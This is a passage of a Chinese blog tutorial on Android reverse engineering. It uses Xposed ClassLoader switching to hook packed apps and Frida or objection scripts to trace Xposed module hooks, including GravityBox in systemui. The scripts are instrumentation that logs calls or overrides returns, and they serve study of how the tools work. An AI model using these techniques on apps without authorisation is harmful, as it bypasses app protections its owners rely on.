fieldName)</span> &#123;</span><br><span class="line"><span class="keyword">return</span> findField(obj.getClass(), fieldName).getBoolean(obj);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title function_">findField</span><span class="params">(<span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName)</span> &#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> findFieldRecursiveImpl(clazz, fieldName);</span><br><span class="line">    field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    fieldCache.put(fullFieldName, field);</span><br><span class="line">    <span class="keyword">return</span> field;    </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> Field <span class="title function_">findFieldRecursiveImpl</span><span class="params">(Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName)</span> <span class="keyword">throws</span> NoSuchFieldException &#123;</span><br><span class="line">    <span class="keyword">return</span> clazz.getDeclaredField(fieldName);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;Frida与Xposed对比：Xposed可以在一个函数中完成针对所有进程的hook，在zygote重新启动后生效。而frida是单进程级别的hook。</p><h4 id="Xposed-Hook加固应用"><a href="#Xposed-Hook加固应用" class="headerlink" title="Xposed Hook加固应用"></a>Xposed Hook加固应用</h4><p>&emsp;对加固应用进行hook时，如果直接hook应用中的函数，则会提示ClassNotFoundException，同样，使用frida在spawn模式下对加固应用进行hook时，也会提示相同错误（但是frida使用attach进行hook时为什么不提示咧？）。</p><p>&emsp;答案是：时机不对，即类加载器ClassLoader在加固应用启动时切换，从而导致上述情况。具体而言，app中的类都是对应的ClassLoader加载到ART虚拟机中的，如果ClassLoader不正确，那么就无法找到对应的类。<code>当加固应用启动时，app的当前ClassLoader会发生切换，故而出现上述情况</code>。                      </p><p>&emsp;那么，如何让xposed在面对加固应用时也可以使用attach注入进程呢？</p><p>&emsp;我们来分析这个问题，首先，xposed注入进程的时机不可更改，即zygote启动时，此时app的Application类并未加载，也就导致用于加载app的业务相关的类的ClassLoader未出现。但是，我们可以<code>手动切换ClassLoader</code>。 </p><p>&emsp;举个例子，当我们静态分析加固app时发现，壳程序总是通过在应用进程中最先获得执行权限的application类中的attachBaseContext与onCreate函数完成对dex的释放与ClassLoader的切换，那么，我们可以hook 这两个函数来获得真实app的上下文。相关代码逻辑如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">XposedHelpers.findAndHookMethod(<span class="string">&quot;com.xxx.StubApp&quot;</span>, loadPackageParam.classloader, <span class="string">&quot;attachBaseContext&quot;</span>, Context.class, <span class="keyword">new</span> <span class="title class_">XC_MethodHook</span>() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">afterHookMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="comment">// 此时 param 指的应该是返回值</span></span><br><span class="line">        <span class="built_in">super</span>.afterHookedMethod(param);</span><br><span class="line">        <span class="type">Context</span> <span class="variable">context</span> <span class="operator">=</span> (Context) param.args[<span class="number">0</span>];</span><br><span class="line">        <span class="comment">// 获取真实业务代码的 classLoader</span></span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">finalClassLoader</span> <span class="operator">=</span> context.getClassLoader();</span><br><span class="line">        <span class="comment">// 之后 hook 真实 classLoader 的 method 即可</span></span><br><span class="line">        XposedHelpers.findAndHookMethod(clzz, finalClassLoader, <span class="string">&quot;method&quot;</span>, ..., <span class="keyword">new</span> <span class="title class_">XC_MethodHook</span>()&#123;</span><br><span class="line">            ...</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>&emsp;上述方法有一个弊端，即一旦加固厂商改变相应继承Application类的类名，在此理解为方法名，即不一定为attachBaseContext函数，那么上述hook就失效了。那如何解决？</p><p>&emsp;再来补充知识：app被zygote孵化后，会通过<code>ActivityThread.main</code>启动相应app，在此函数中创建ActivityThread的实例，并进行初始化操作。ActivityThread类至关重要，它根据ActivityManager发送的请求对activities、broadcast Receviers等操作进行调度执行。<code>ActivityThread中的performLaunchActivity函数用于响应与activity相关的操作，ActivityThread中的mInitialApplication存放着当前的ClassLoader</code>。</p><p>&emsp;以movetv的MainActivity为例，实现hook的代码如下所示（代码放在函数handleLoadPackage中）：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> android.app.Application;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(loadPackageParam.packageName.equals(<span class="string">&quot;com.cz.babySister&quot;</span>))&#123;</span><br><span class="line">    XposedBridge.log(<span class="string">&quot;hooked &quot;</span> + loadPackageParam.processName);</span><br><span class="line">    <span class="comment">// hook ActivityThread 类</span></span><br><span class="line">    <span class="type">Class</span> <span class="variable">ActivityThread</span> <span class="operator">=</span> XposedHelpers.findClass(<span class="string">&quot;android.app.ActivityThread&quot;</span>, loadPackageParam.classLoader);</span><br><span class="line">    <span class="comment">// performLaunchActivity 用于响应与 activity 相关的操作</span></span><br><span class="line">    XposedBridge.hookAllMethods(ActivityThread, <span class="string">&quot;performLaunchActivity&quot;</span>, <span class="keyword">new</span> <span class="title class_">XC_MethodHook</span>()&#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">afterHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable&#123;</span><br><span class="line">            <span class="built_in">super</span>.afterHookedMethod(param);</span><br><span class="line">            <span class="comment">// 获取 ActivityThread 类中的 mInitialApplication 成员</span></span><br><span class="line">            <span class="type">Application</span> <span class="variable">mInitialApplication</span> <span class="operator">=</span> (Application) XposedHelpers.getObjectField(param.thisObject, <span class="string">&quot;mInitialApplication&quot;</span>);</span><br><span class="line">            <span class="type">ClassLoader</span> <span class="variable">finalLoader</span> <span class="operator">=</span> mInitialApplication.getClassLoader();</span><br><span class="line">            XposedBridge.log(<span class="string">&quot;found classloader is =&gt; &quot;</span> + finalLoader.toString());</span><br><span class="line"></span><br><span class="line">            <span class="type">Class</span> <span class="variable">BabyLogin</span> <span class="operator">=</span> finalLoader.loadClass(<span class="string">&quot;com.cz.babySister.activity.LoginActivity&quot;</span>);</span><br><span class="line">            XposedBridge.log(<span class="string">&quot;Debug -&gt; &quot;</span> + BabyLogin.toString());</span><br><span class="line">            XposedBridge.hookAllMethods(BabyLogin, <span class="string">&quot;onCreate&quot;</span>, <span class="keyword">new</span> <span class="title class_">XC_MethodHook</span>()&#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">beforeHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable&#123;</span><br><span class="line">                    <span class="comment">// 当启动 MainActivity 时进行 Log</span></span><br><span class="line">                    <span class="built_in">super</span>.beforeHookedMethod(param);</span><br><span class="line">                    XposedBridge.log(<span class="string">&quot;LoginActivity onCreate called&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;结果如下所示：</p><p><img src="/images/frida-reverse-analysis-2/image-20231020201257929.png" alt="image-20231020201257929" style="zoom:67%;" /></p><h4 id="Frida-探-Xposed-Hook"><a href="#Frida-探-Xposed-Hook" class="headerlink" title="Frida 探 Xposed Hook"></a>Frida 探 Xposed Hook</h4><p>&emsp;本节利用frida，来学习Xposed是如何进行hook的。以<code>Xposed 安装&amp;Xposed插件（模块）</code>一节中的示例插件为例，使用objection注入目标进程，搜索com.roysue.xposed1.HookTest，命令行如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">objection -g com.roysue.xposed1 explore</span><br><span class="line">android hooking search classes HookTest</span><br></pre></td></tr></table></figure><p>&emsp;结果如下：</p><p><img src="/images/frida-reverse-analysis-2/image-20231020202510881.png" alt="image-20231020202510881" style="zoom:67%;" /></p><p>&emsp;但是，如果想要执行以下两条命令的任何一条时，就会报错，显示ClassNotFoundException：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// 列出类中的函数</span><br><span class="line">android hooking list class_methods com.roysue.xposed1.HookTest</span><br><span class="line">android hooking list class_methods com.roysue.xposed1.HookTest$1</span><br><span class="line">// 钩取类中的所有函数</span><br><span class="line">android hooking watch class com.roysue.xposed1.HookTest</span><br><span class="line">android hooking watch class com.roysue.xposed1.HookTest$1</span><br></pre></td></tr></table></figure><p>&emsp;这里之所以报错，是因为：<code>ClassLoader不对，objection中并未结合frida中切换ClassLoader的功能，因此这部分需要自己写脚本完成。</code>如下traceXposed.js所示：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// traceXposed.js</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hook</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="comment">// enumerateClassLoaders 是 frida 的 api</span></span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">enumerateClassLoaders</span>(&#123;</span><br><span class="line">            <span class="attr">onMatch</span>: <span class="keyword">function</span>(<span class="params">loader</span>)&#123;</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                    <span class="keyword">if</span>(loader.<span class="title function_">findClass</span>(<span class="string">&quot;com.roysue.xposed1.HookTest&quot;</span>))&#123;</span><br><span class="line">                        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;found!&quot;</span>)</span><br><span class="line">                        <span class="variable language_">console</span>.<span class="title function_">log</span>(loader)</span><br><span class="line">                        <span class="comment">// 切换 classLoader</span></span><br><span class="line">                        <span class="title class_">Java</span>.<span class="property">classFactory</span>.<span class="property">loader</span> = loader</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">catch</span>(error)&#123;&#125;</span><br><span class="line">            &#125;, <span class="attr">onComplete</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;end&quot;</span>)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(hook)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida -U -f com.roysue.xposed1 -l traceXposed.js --no-pause</span><br></pre></td></tr></table></figure><p>&emsp;输出此时含有com.roysue.xposed1.HookTest的ClassLoader，如下所示：</p><p><img src="/images/frida-reverse-analysis-2/image-20231020215345260.png" alt="image-20231020215345260" style="zoom:67%;" /></p><p>&emsp;完成切换后，对目标类进行hook发现不再报错，在下面的代码中，针对HookTest类中的PrintStack进行Hook，脚本如下所示：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// traceXposed.js</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hook</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="comment">// enumerateClassLoaders 是 frida 的 api</span></span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">enumerateClassLoaders</span>(&#123;</span><br><span class="line">            ...</span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="comment">// hook PrintStack 函数</span></span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.roysue.xposed1.HookTest&quot;</span>).<span class="property">PrintStack</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;hacked by wd&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(hook)</span><br></pre></td></tr></table></figure><p>&emsp;注入之后，点击应用的button，会调用PrintStack，此时会显示”hacked by wd”。作者发现，切换完ClassLoader之后，虽然能够获取com.roysue.xposed1.HookTest的类，但是对于Xposed提供的api，例如XposedBridge.log等，钩取时也会出现ClassNotFoundException错误，这说明：<code>使用Xposed实现的插件与Xposed自身的api不在一个ClassLoader所能加载的范围内</code>。</p><p>&emsp;我们先查看XposedBridge对应的ClassLoader叫啥？脚本如下所示：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// traceXposed.js</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hook</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="comment">// enumerateClassLoaders 是 frida 的 api</span></span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">enumerateClassLoaders</span>(&#123;</span><br><span class="line">            <span class="attr">onMatch</span>: <span class="keyword">function</span>(<span class="params">loader</span>)&#123;</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                    <span class="keyword">if</span>(loader.<span class="title function_">findClass</span>(<span class="string">&quot;de.robv.android.xposed.XposedBridge&quot;</span>))&#123;</span><br><span class="line">                        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;found!&quot;</span>)</span><br><span class="line">                        <span class="variable language_">console</span>.<span class="title function_">log</span>(loader)</span><br><span class="line">                        <span class="comment">// 切换 classLoader</span></span><br><span class="line">                        <span class="title class_">Java</span>.<span class="property">classFactory</span>.<span class="property">loader</span> = loader</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">catch</span>(error)&#123;&#125;</span><br><span class="line">            &#125;, <span class="attr">onComplete</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;end&quot;</span>)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(hook)</span><br></pre></td></tr></table></figure><p>&emsp;结果如下所示：</p><p><img src="/images/frida-reverse-analysis-2/image-20231020215424099.png" alt="image-20231020215424099" style="zoom:67%;" /></p><p>&emsp;对比发现，Xposed插件在<code>/data/app/com.roysue.xposed1-1/base.apk</code>中，而Xposed的api在<code>/system/framework/XposedBridge.jar</code>中。结合代码，可以得出结论，Xposed插件实现了Xposed框架的IXposedHookLoadPackage接口，而XposedBridge则是调用XposedBridge.jar中的函数。</p><p>&emsp;再次分析上面xposed插件的代码，发现beforeHookedMethod与afterHookedMethod函数都在使用<code>new XC_MethodHook</code>构建的内部匿名类<code>HookTest$1</code>中，因此需要将ClassLoader切换为<code>HookTest$1</code>所在的loader。针对上面xposed插件，对beforeHookedMethod与afterHookedMethod进行hook，脚本如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// hook.js</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">traceMethod</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">enumerateClassLoaders</span>(&#123;</span><br><span class="line">            <span class="attr">onMatch</span>: <span class="keyword">function</span>(<span class="params">loader</span>)&#123;</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                    <span class="comment">// 切换为 com.roysue.xposed1.HookTest$1 类的 loader</span></span><br><span class="line">                    <span class="keyword">if</span>(loader.<span class="title function_">findClass</span>(<span class="string">&quot;com.roysue.xposed1.HookTest$1&quot;</span>))&#123;</span><br><span class="line">                        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;found!&quot;</span>)</span><br><span class="line">                        <span class="variable language_">console</span>.<span class="title function_">log</span>(loader)</span><br><span class="line">                        <span class="title class_">Java</span>.<span class="property">classFactory</span>.<span class="property">loader</span> = loader</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">catch</span>(error)&#123;&#125;</span><br><span class="line">            &#125;, <span class="attr">onComplete</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;end&quot;</span>)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)  </span><br><span class="line">        <span class="keyword">var</span> targetClassMethod = <span class="string">&quot;com.roysue.xposed1.HookTest$1.beforeHookedMethod&quot;</span></span><br><span class="line">        <span class="keyword">var</span> delim = targetClassMethod.<span class="title function_">lastIndexOf</span>(<span class="string">&quot;.&quot;</span>)</span><br><span class="line">        <span class="keyword">var</span> targetClass = targetClassMethod.<span class="title function_">slice</span>(<span class="number">0</span>, delim)</span><br><span class="line">        <span class="keyword">var</span> targetMethod = targetClassMethod.<span class="title function_">slice</span>(delim + <span class="number">1</span>, targetClassMethod.<span class="property">length</span>)   </span><br><span class="line">        <span class="keyword">var</span> hook = <span class="title class_">Java</span>.<span class="title function_">use</span>(targetClass)</span><br><span class="line">        <span class="comment">// targetMethod 的重载数量</span></span><br><span class="line">        <span class="keyword">var</span> overloadCount = hook[targetMethod].<span class="property">overloads</span>.<span class="property">length</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Tracing &quot;</span> + targetClassMethod + <span class="string">&quot; [&quot;</span> + overloadCount + <span class="string">&quot; overload(s)]&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; overloadCount; i++) &#123;</span><br><span class="line">            hook[targetMethod].<span class="property">overloads</span>[i].<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">warn</span>(<span class="string">&quot;\n*** entered &quot;</span> + targetClassMethod)</span><br><span class="line">                <span class="comment">// 打印参数 arguments</span></span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; <span class="variable language_">arguments</span>.<span class="property">length</span>; j++) &#123;</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;arg[&quot;</span> + j + <span class="string">&quot;]: &quot;</span> + <span class="variable language_">arguments</span>[j])</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// 打印返回值 retval</span></span><br><span class="line">                <span class="keyword">var</span> retval = <span class="variable language_">this</span>[targetMethod].<span class="title function_">apply</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>)</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;retval: &quot;</span> + retval)</span><br><span class="line">                <span class="keyword">return</span> retval</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;    </span><br><span class="line">    &#125;)    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;之后点击button，显示：</p><p><img src="/images/frida-reverse-analysis-2/image-20231021164742074.png" alt="image-20231021164742074" style="zoom:67%;" /></p><p>&emsp;同理，钩取afterHookedMethod，显示：</p><p><img src="/images/frida-reverse-analysis-2/image-20231021164848886.png" alt="image-20231021164848886" style="zoom:67%;" /></p><p>&emsp;接下来，以GravityBox为例，来描述如何对beforeHookedMethod与afterHookedMethod进行hook。</p><p>（1）GravityBox.apk下载<a href="https://www.modapkdown.com/com.ceco.nougat.gravitybox/download-by-happymod.html">链接</a>，下载并安装此插件。</p><p>（2）以修改状态栏颜色的类com.ceco.nougat.gravitybox.ModStatusbarColor为例，找其相关的匿名类（不使用之前的objection方法）：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// hook.js</span></span><br><span class="line"><span class="comment">// 寻找思想：默认存在 ModStatusbarColor$1 匿名类，获取相应的 loader，ModStatusbarColor$1 的其它匿名类也应该使用此 loader。因此，找寻此 loader 加载的所有 gravitybox 匿名类，且匿名类应该继承于 XC_MethodHook，匿名类中应该有 ModStatusbarColor 字符串。</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">lookClass</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="comment">// 查找所有的类，以它们为 loader，从而查找 ModStatusbarColor$1 匿名类，并将其作为 loader</span></span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">enumerateClassLoaders</span>(&#123;</span><br><span class="line">            <span class="attr">onMatch</span>: <span class="keyword">function</span> (<span class="params">loader</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span>(loader.<span class="title function_">findClass</span>(<span class="string">&quot;com.ceco.nougat.gravitybox.ModStatusbarColor$1&quot;</span>))&#123;</span><br><span class="line">                        <span class="title class_">Java</span>.<span class="property">classFactory</span>.<span class="property">loader</span> = loader ;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">catch</span>(error)&#123;&#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">onComplete</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;&#125;</span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="comment">// ModStatusbarColor$1 相应的 loader 可能会加载其他的匿名类</span></span><br><span class="line">        <span class="title class_">Java</span>.<span class="property">enumerateLoadedClasses</span> (&#123;</span><br><span class="line">            <span class="attr">onMatch</span>:<span class="keyword">function</span>(<span class="params">className</span>)&#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="comment">// 找到 gravitybox 的所有匿名类</span></span><br><span class="line">                    <span class="keyword">if</span>(className.<span class="title function_">toString</span>().<span class="title function_">indexOf</span>(<span class="string">&quot;gravitybox&quot;</span>) &gt; <span class="number">0</span> &amp;&amp; className.<span class="title function_">toString</span>().<span class="title function_">indexOf</span>(<span class="string">&quot;$&quot;</span>) &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                        <span class="comment">// 获得匿名类的父类，应该是 XC_MethodHook 才对，这种匿名类有 beforeHookedMethod 与 afterHookedMethod 函数</span></span><br><span class="line">                        <span class="keyword">if</span>(<span class="title class_">Java</span>.<span class="title function_">use</span>(className).<span class="property">class</span>.<span class="title function_">getSuperclass</span>())&#123;</span><br><span class="line">                            <span class="keyword">var</span> superClass = <span class="title class_">Java</span>.<span class="title function_">use</span>(className).<span class="property">class</span>.<span class="title function_">getSuperclass</span>().<span class="title function_">getName</span>()</span><br><span class="line">                            <span class="keyword">if</span> (superClass.<span class="title function_">indexOf</span>(<span class="string">&quot;XC_MethodHook&quot;</span>) &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                                <span class="variable language_">console</span>.<span class="title function_">log</span>(className)</span><br><span class="line">                                <span class="comment">// traceClass(className)</span></span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;     </span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">catch</span>(error)&#123;&#125;</span><br><span class="line">            &#125;, <span class="attr">onComplete</span>:<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;search completed!&quot;</span>)     </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)  </span><br><span class="line">    &#125;)    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;这种寻找方法一个ModStatusbarColor匿名类也没找到，显然是错误的。这是为什么呢？<code>这是因为，由于Frida是进程级别的，而xposed在将代码对进程进行注入时做了进程的判断，例如xposed的ModStatusbarColor类是要对com.android.systemui进行注入，从而改变颜色。因此，只有判断进程是com.android.systemui时，才会初始化ModStatusbarColor类。但是，Frida脚本注入到了插件xposed1中，名字不为com.android.systemui，因此com.android.systemui类并未被初始化，也就找不到其匿名类。</code>原理如下图所示（Xposed开机时会钩取所有进程，此时给systemui注入了ModStatusbarColor）：</p><p><img src="/images/frida-reverse-analysis-2/image-20231021180801457.png" alt="image-20231021180801457" style="zoom:67%;" /></p><p>&emsp;那么，之后我们对systemui进程进行frida注入（hook.js代码无需修改），并进行搜索：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida -U com.android.systemui -l hook.js --no-pause</span><br></pre></td></tr></table></figure><p>&emsp;结果如下所示：</p><p><img src="/images/frida-reverse-analysis-2/image-20231021181737662.png" alt="image-20231021181737662" style="zoom:67%;" 